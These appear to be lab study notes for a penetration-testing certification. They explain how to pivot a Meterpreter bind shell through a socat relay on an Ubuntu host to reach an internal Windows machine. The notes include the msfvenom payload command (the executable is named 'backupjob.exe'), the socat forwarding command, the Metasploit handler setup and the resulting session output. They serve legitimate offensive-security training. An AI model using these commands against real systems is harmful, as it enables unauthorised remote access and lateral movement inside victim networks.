# 🔗 1. Socat Redirection with a Bind Shell

> [!info] The Big Difference: Reverse Shell vs Bind Shell  
> With a **reverse shell**, the target initiates the connection outward:
> 
> ```text
> Target ───────► Pivot ───────► Attack Host
> ```
> 
> With a **bind shell**, the target creates a listener, and the attacker connects **toward the target**:
> 
> ```text
> Attack Host ───────► Pivot ───────► Target
> ```
> 
> Socat can be used in both situations. The major difference is **which side initiates the connection**.

---

# 🧠 2. Reverse Shell vs Bind Shell Mental Model

## 🔴 Reverse Shell

The Windows target runs a payload configured with the attacker's/pivot's address:

```text
Windows Target
      │
      │ "I need to connect OUT"
      ▼
Ubuntu Pivot
      │
      │ Socat forwards connection
      ▼
Attack Host
      │
      ▼
Metasploit Handler
```

The target is the **client**.

The attacker is waiting as the **listener**.

---

## 🔵 Bind Shell

The Windows target runs a payload that creates a listener:

```text
Windows Target
      │
      │ LISTEN :8443
      │
      ▼
Ubuntu Pivot
      │
      │ Socat :8080
      │
      ▼
Attack Host
      │
      │ CONNECT :8080
      ▼
Metasploit Bind Handler
```

Now the attacker is the **client**.

The Windows target is the **listener**.

> [!important] The Direction Has Reversed
> 
> Reverse:
> 
> ```text
> Target → Pivot → Attacker
> ```
> 
> Bind:
> 
> ```text
> Attacker → Pivot → Target
> ```
> 
> This is the single most important thing to understand before looking at the commands.

---

# 🌐 3. Network Topology

The scenario can be represented as:

```text
                    ATTACK NETWORK
                         │
                         │
                ┌────────▼────────┐
                │   Attack Host   │
                │   10.10.15.5    │
                │                 │
                │ MSF Bind Handler│
                └────────┬────────┘
                         │
                         │ Connect :8080
                         ▼
                ┌──────────────────┐
                │   Ubuntu Server  │
                │      Pivot       │
                │                  │
                │ Socat :8080      │
                └────────┬─────────┘
                         │
                         │ Forward → :8443
                         ▼
                ┌──────────────────┐
                │    Windows A     │
                │                  │
                │ Bind Shell :8443 │
                └──────────────────┘
```

The complete traffic path is:

```text
Attack Host
10.10.15.5
     │
     │ TCP → Ubuntu:8080
     ▼
Ubuntu
Socat :8080
     │
     │ TCP → Windows:8443
     ▼
Windows A
Bind Shell :8443
```

The key problem is that the attack host cannot directly reach the Windows target.

However:

```text
Attack Host → Ubuntu       ✅
Ubuntu → Windows            ✅
Attack Host → Windows       ❌
```

Therefore, Ubuntu becomes the **redirector/pivot**.

---

# 💡 4. Why Use a Bind Shell Here?

The author is deliberately changing the traffic direction.

Suppose:

```text
Windows → Attack Host
```

is impossible because of network segmentation/firewall rules.

A reverse shell therefore cannot work directly.

But if:

```text
Attack Host → Ubuntu
Ubuntu → Windows
```

is possible, we can reverse the architecture.

Instead of asking the Windows machine to connect outward:

```text
Windows ──X──► Attack Host
```

we make Windows listen:

```text
Windows
   │
   └── LISTEN :8443
```

Then the attacker connects through Ubuntu:

```text
Attack Host
     │
     ▼
Ubuntu
     │
     ▼
Windows :8443
```

This is why **bind vs reverse is fundamentally a traffic-direction decision**.

---

# 🪟 5. Create the Windows Bind Shell Payload

The Windows payload is created with:

```shell
k33lwa@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

The important part is:

```text
windows/x64/meterpreter/bind_tcp
```

This is a **bind TCP Meterpreter payload**.

Unlike a reverse payload, we don't provide an `LHOST`.

Why?

Because the payload is not being told:

> "Connect to this host."

Instead, it is being told:

> "Open a listening TCP socket on this port."

That port is:

```text
LPORT=8443
```

So after execution, conceptually:

```text
Windows
┌────────────────────┐
│ Meterpreter        │
│ Bind Listener      │
│                    │
│ TCP :8443          │
└────────────────────┘
```

---

# 🔍 6. Understanding `LPORT=8443`

```shell
LPORT=8443
```

defines the port on which the bind payload listens.

Therefore:

```text
Windows Target
       │
       ▼
TCP 8443
       │
       └── Bind shell
```

There is no `LHOST` because the payload does not initiate the connection.

> [!important] Remember
> 
> **Reverse payload:**
> 
> ```text
> LHOST = where I connect
> LPORT = where I connect
> ```
> 
> **Bind payload:**
> 
> ```text
> LPORT = where I listen
> ```
> 
> The exact Metasploit terminology can be confusing, so always think in terms of **actual traffic direction**, not just variable names.

---

# 🔀 7. Start the Socat Redirector

On Ubuntu:

```shell
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

This creates the bridge:

```text
Ubuntu :8080
      │
      │ Socat
      ▼
Windows 172.16.5.19:8443
```

## 🧩 Breaking Down the Command

```text
socat
│
├── TCP4-LISTEN:8080,fork
│       │
│       ├── Listen for TCP/IPv4 connections
│       ├── Listen on port 8080
│       └── fork for incoming connections
│
└── TCP4:172.16.5.19:8443
        │
        ├── Connect to Windows target
        ├── IP = 172.16.5.19
        └── Port = 8443
```

Therefore:

```text
Attack Host
     │
     │ CONNECT :8080
     ▼
Ubuntu Socat
     │
     │ CONNECT :8443
     ▼
Windows Bind Shell
```

---

# 🧠 8. What Socat Is Doing Here

Socat is effectively acting as a **TCP bridge**.

It creates two sockets:

```text
Socket A
Ubuntu:8080
     │
     │
     ▼
   SOCAT
     │
     │
     ▼
Socket B
Windows:8443
```

When the attack host connects to:

```text
Ubuntu:8080
```

Socat creates/uses a connection toward:

```text
172.16.5.19:8443
```

and relays the traffic between the two.

So the attacker doesn't need direct access to:

```text
172.16.5.19:8443
```

The attacker only needs access to:

```text
Ubuntu:8080
```

---

# 🎧 9. Configure the Metasploit Bind Handler

Now the attack host needs a handler configured for a **bind** payload:

```shell
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

This is where the traffic direction becomes particularly important.

---

# 🔍 10. Understanding `RHOST`

The handler is configured with:

```text
RHOST=10.129.202.64
```

The handler will attempt to connect to:

```text
10.129.202.64:8080
```

In this topology, that address represents the **Ubuntu pivot/redirector** from the attack host's perspective.

Therefore:

```text
Metasploit
   │
   │ CONNECT
   ▼
10.129.202.64:8080
   │
   ▼
Socat
```

Socat then forwards the connection to:

```text
172.16.5.19:8443
```

where the Windows bind shell is listening.

> [!warning] Don't Confuse `RHOST` With the Final Target  
> In a pivoting setup, the address supplied to the handler is the address that the **handler can actually reach**.
> 
> Here:
> 
> ```text
> Metasploit → Ubuntu:8080
> ```
> 
> and then:
> 
> ```text
> Ubuntu → Windows:8443
> ```
> 
> The Windows machine is the ultimate destination, but the handler's immediate destination is the Socat listener.

---

# 🔄 11. The Complete Connection Sequence

This is the most important part of the entire walkthrough.

### Step 1 — Execute the payload

The Windows payload:

```text
windows/x64/meterpreter/bind_tcp
```

starts listening:

```text
Windows
172.16.5.19
     │
     └── LISTEN :8443
```

---

### Step 2 — Socat is already listening

Ubuntu is listening on:

```text
Ubuntu
     │
     └── LISTEN :8080
```

and configured to forward to:

```text
172.16.5.19:8443
```

---

### Step 3 — Metasploit starts the bind handler

Metasploit attempts:

```text
Attack Host
     │
     │ CONNECT
     ▼
Ubuntu:8080
```

---

### Step 4 — Socat accepts the connection

Socat receives:

```text
Attack Host → Ubuntu:8080
```

and creates the second connection:

```text
Ubuntu → 172.16.5.19:8443
```

---

### Step 5 — Windows accepts the connection

The Windows bind payload is listening on:

```text
172.16.5.19:8443
```

so the connection succeeds.

---

### Step 6 — Meterpreter staging occurs

The Meterpreter stage is transferred through the established connection.

The final path is therefore:

```text
┌──────────────┐
│ Attack Host  │
│              │
│ MSF Handler  │
└──────┬───────┘
       │
       │ TCP :8080
       ▼
┌──────────────┐
│ Ubuntu       │
│ Socat        │
│ LISTEN :8080 │
└──────┬───────┘
       │
       │ TCP :8443
       ▼
┌──────────────┐
│ Windows      │
│ Bind Shell   │
│ LISTEN :8443 │
└──────────────┘
```

---

# 🖥️ 12. Establishing the Meterpreter Session

After executing the Windows payload, Metasploit shows:

```shell
[*] Sending stage (200262 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

The important result is:

```text
Meterpreter session 1 opened
```

and:

```text
Server username: INLANEFREIGHT\victor
```

This proves the connection successfully traversed the pivot.

---

# 🧩 13. Understanding the Session Output

The output:

```text
10.10.14.18:46253 -> 10.129.202.64:8080
```

shows the attack host's connection to the redirector.

It does **not** mean that the Windows machine is actually:

```text
10.129.202.64
```

The session is being reached through the Socat redirector.

The conceptual path remains:

```text
10.10.14.18
Attack Host
     │
     │ :8080
     ▼
10.129.202.64
Ubuntu/Pivot
     │
     │ :8443
     ▼
172.16.5.19
Windows
```

This is why you should learn to read the **network topology** separately from the endpoint information displayed by the tool.

---

# ⚔️ 14. Reverse Socat vs Bind Socat

The two previous sections look similar because both use Socat, but the traffic direction is completely different.

|Property|Socat Reverse Shell|Socat Bind Shell|
|---|---|---|
|Target behavior|Initiates connection|Listens for connection|
|Target payload|`reverse_https`|`bind_tcp`|
|Target connection|Target → Pivot|Pivot → Target|
|Attacker behavior|Listens|Connects|
|Socat role|Receives target connection and forwards it|Receives attacker connection and forwards it|
|Overall direction|Target → Pivot → Attacker|Attacker → Pivot → Target|
|Main advantage|Useful when target can make outbound connections|Useful when attacker can reach pivot and pivot can reach target|

The easiest way to memorize this is:

```text
REVERSE:

Target
  │
  │ CONNECT
  ▼
Pivot
  │
  │ CONNECT
  ▼
Attacker


BIND:

Attacker
  │
  │ CONNECT
  ▼
Pivot
  │
  │ CONNECT
  ▼
Target
```

---

# 🧠 15. Why the Same Socat Concept Works Both Ways

Socat itself doesn't care whether you're using a reverse or bind shell.

Its basic job remains:

```text
LISTEN HERE
     ↓
RECEIVE TCP
     ↓
FORWARD TCP
     ↓
DESTINATION THERE
```

What changes is **who initiates the first connection**.

### Reverse

```text
Target initiates
       ↓
Socat receives
       ↓
Socat forwards
       ↓
Attacker receives
```

### Bind

```text
Attacker initiates
       ↓
Socat receives
       ↓
Socat forwards
       ↓
Target's bind listener receives
```

So don't memorize Socat commands as isolated tricks.

Understand the connection model first.

---

# 🧭 16. How the Author Arrived at the Bind-Shell Solution

The reasoning can be reconstructed step by step.

## 1️⃣ Identify the network restriction

The attacker cannot directly access the Windows host:

```text
Attack Host ───X───► Windows
```

But Ubuntu can reach Windows:

```text
Ubuntu ───────► Windows
```

and the attacker can reach Ubuntu:

```text
Attack Host ───────► Ubuntu
```

Therefore Ubuntu can act as a pivot.

---

## 2️⃣ Decide whether a reverse shell is appropriate

A reverse shell requires:

```text
Windows → Attacker
```

through some route.

If that direction is unavailable, a reverse shell is a poor choice.

Instead, ask:

> "Can I make the Windows machine listen, and can I reach that listener through the pivot?"

If yes, a bind shell becomes a candidate.

---

## 3️⃣ Create the bind payload

The Windows payload is:

```text
windows/x64/meterpreter/bind_tcp
```

with:

```text
LPORT=8443
```

So Windows becomes:

```text
LISTEN 172.16.5.19:8443
```

---

## 4️⃣ Create the pivot

Ubuntu listens on:

```text
:8080
```

and forwards to:

```text
172.16.5.19:8443
```

Therefore:

```text
Ubuntu:8080 → Windows:8443
```

---

## 5️⃣ Tell Metasploit to connect to Ubuntu

The handler connects to:

```text
Ubuntu:8080
```

not directly to:

```text
Windows:8443
```

because the attacker cannot directly reach the Windows network.

---

## 6️⃣ Let Socat bridge the gap

Socat performs:

```text
Attacker → Ubuntu:8080
                │
                ▼
          Windows:8443
```

Now the attacker effectively reaches the bind shell without having direct network access to the Windows host.

---

# 🗺️ 17. CPTS Pivoting Decision Tree

When you encounter a segmented network, think like this:

```text
                    Target inaccessible?
                            │
                            ▼
                 Find reachable pivot
                            │
                            ▼
             What traffic direction works?
                            │
                ┌───────────┴───────────┐
                │                       │
                ▼                       ▼
        Target can connect       Target cannot connect
        outward                  outward
                │                       │
                ▼                       ▼
         Reverse shell             Bind shell?
                │                       │
                ▼                       ▼
       Target → Pivot →            Attacker → Pivot
          Attacker                       │
                                         ▼
                                      Target
```

Then choose the forwarding mechanism:

```text
One TCP connection
        │
        ├── Socat
        │
        ├── SSH forwarding
        │
        └── Meterpreter portfwd

Multiple internal services
        │
        └── SOCKS / ProxyChains
```

---

# 🔥 18. Reverse vs Bind: The CPTS Mental Shortcut

> [!tip] Ask One Question First  
> **"Who needs to initiate the connection?"**

If the answer is:

```text
Target initiates
```

think:

```text
REVERSE SHELL
```

If the answer is:

```text
Attacker initiates
```

think:

```text
BIND SHELL
```

Then ask:

> **"Can that initiating side actually reach the next hop?"**

That second question determines whether you need a pivot.

---

# 🧠 19. Final Mental Model

The entire bind-shell scenario can be reduced to:

```text
                 BIND SHELL THROUGH SOCAT

Windows
172.16.5.19
     │
     │ LISTEN :8443
     │
     ▼
┌─────────────────┐
│   Windows Bind  │
│      Shell      │
└────────▲────────┘
         │
         │ Socat forwards
         │
┌────────┴────────┐
│ Ubuntu Pivot    │
│ Socat :8080     │
└────────▲────────┘
         │
         │ Attacker connects
         │
┌────────┴────────┐
│ Attack Host     │
│ MSF Handler     │
└─────────────────┘
```

The actual flow is:

```text
1. Windows executes bind payload
           ↓
2. Windows listens on :8443
           ↓
3. Ubuntu Socat listens on :8080
           ↓
4. Socat knows :8080 → Windows:8443
           ↓
5. Metasploit connects to Ubuntu:8080
           ↓
6. Socat forwards the connection
           ↓
7. Windows accepts connection on :8443
           ↓
8. Meterpreter stage is transferred
           ↓
9. Meterpreter session established
```

> [!success] Key Takeaways
> 
> - **Reverse shell:** target initiates the connection.
>     
> - **Bind shell:** target listens; attacker initiates the connection.
>     
> - **Socat:** bridges two TCP endpoints.
>     
> - In this scenario, Ubuntu is the **pivot/redirector**.
>     
> - Windows listens on:
>     
>     ```text
>     172.16.5.19:8443
>     ```
>     
> - Ubuntu listens on:
>     
>     ```text
>     :8080
>     ```
>     
> - Socat connects:
>     
>     ```text
>     Ubuntu:8080 → Windows:8443
>     ```
>     
> - Metasploit connects:
>     
>     ```text
>     Attack Host → Ubuntu:8080
>     ```
>     
> - The final traffic path is:
>     
>     ```text
>     Attack Host → Ubuntu/Socat → Windows Bind Shell
>     ```
>     
> - The CPTS lesson is broader than the specific Socat command:
>     
>     ```text
>     Understand topology
>          ↓
>     Determine who can reach whom
>          ↓
>     Determine viable traffic direction
>          ↓
>     Choose reverse or bind
>          ↓
>     Choose forwarding mechanism
>          ↓
>     Configure each hop consistently
>          ↓
>     Establish the session
>     ```
>